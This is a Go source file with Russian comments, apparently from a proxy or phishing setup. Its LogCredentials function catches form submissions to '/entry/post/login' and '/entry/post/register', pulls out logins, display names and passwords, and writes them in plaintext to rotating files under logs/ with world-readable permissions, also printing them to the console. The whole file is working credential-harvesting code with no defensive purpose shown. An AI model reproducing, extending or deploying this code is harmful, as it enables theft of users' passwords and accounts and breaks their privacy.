package logging

import (
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	fileIndex    uint64 = 0
	fileWriteMux sync.Mutex
	maxFiles     int    = 5 // По умолчанию 5 файлов
)

// SetMaxFiles устанавливает количество файлов для писания
func SetMaxFiles(count int) {
	if count > 0 {
		maxFiles = count
	}
}

// LogCredentials логирует попытки логина и регистрации в разные файлы по очереди
func LogCredentials(path string, body []byte) {
	if !strings.Contains(path, "/entry/post/login") && !strings.Contains(path, "/entry/post/register") {
		return
	}

	bodyStr := string(body)

	// Парсим POST параметры
	credentials := make(map[string]string)
	pairs := strings.Split(bodyStr, "&")
	for _, pair := range pairs {
		parts := strings.SplitN(pair, "=", 2)
		if len(parts) == 2 {
			key, _ := url.QueryUnescape(parts[0])
			val, _ := url.QueryUnescape(parts[1])
			credentials[key] = val
		}
	}

	// Проверяем есть ли нужные параметры
	login, hasLogin := credentials["login"]
	password, hasPassword := credentials["password"]
	displayName, hasDisplayName := credentials["display_name"]
	password1, hasPassword1 := credentials["password1"]

	if !hasLogin || (!hasPassword && !hasPassword1) {
		return // Не логируем если нет логина или пароля
	}

	// Формируем строку логирования
	var logLine string
	if strings.Contains(path, "/entry/post/register") {
		logLine = fmt.Sprintf("REGISTER | login=%s | display_name=%s | password1=%s | password2=%s | time=%s\n",
			login, displayName, password1, credentials["password2"], time.Now().Format("2006-01-02 15:04:05"))
	} else {
		logLine = fmt.Sprintf("LOGIN | login=%s | password=%s | time=%s\n",
			login, password, time.Now().Format("2006-01-02 15:04:05"))
	}

	// Пишем в файл по очереди
	writeToLogFile(logLine)

	log.Printf("[LOGGED] %s", strings.TrimSpace(logLine))
}

// writeToLogFile пишет в файл по очереди
func writeToLogFile(logLine string) {
	fileWriteMux.Lock()
	defer fileWriteMux.Unlock()

	// Создаем директорию если её нет
	os.MkdirAll("logs", 0755)

	// Берем текущий номер файла и увеличиваем счетчик
	idx := atomic.AddUint64(&fileIndex, 1) % uint64(maxFiles)
	filename := fmt.Sprintf("logs/logins_%d.txt", idx)

	// Пишем в файл
	f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Printf("[ERR] Failed to open %s: %v", filename, err)
		return
	}
	defer f.Close()

	if _, err := f.WriteString(logLine); err != nil {
		log.Printf("[ERR] Failed to write to %s: %v", filename, err)
		return
	}

	log.Printf("[FILE] Записано в %s", filename)
}


